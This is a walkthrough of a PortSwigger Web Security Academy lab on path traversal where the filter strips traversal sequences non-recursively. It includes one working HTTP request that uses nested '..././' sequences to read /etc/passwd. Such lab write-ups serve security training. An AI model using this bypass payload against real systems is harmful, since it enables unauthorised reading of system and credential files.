
# 14 - File path traversal, traversal sequences stripped non-recursively

This lab contains a file path traversal vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the /etc/passwd file.


---------------------------------------------

References:

- https://portswigger.net/kb/issues/00100300_file-path-traversal

- https://portswigger.net/web-security/file-path-traversal

- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal

---------------------------------------------

Generated link: https://0a2a0030049b8f43822a9e64007d00ba.web-security-academy.net/


When accessing Home or a post we have GET requests like this one:



![img](images/14%20-%20File%20path%20traversal,%20traversal%20sequences%20stripped%20non-recursively/1.png)




![img](images/14%20-%20File%20path%20traversal,%20traversal%20sequences%20stripped%20non-recursively/2.png)

```
GET /image?filename=..././..././..././..././..././etc/passwd HTTP/2
```



![img](images/14%20-%20File%20path%20traversal,%20traversal%20sequences%20stripped%20non-recursively/3.png)
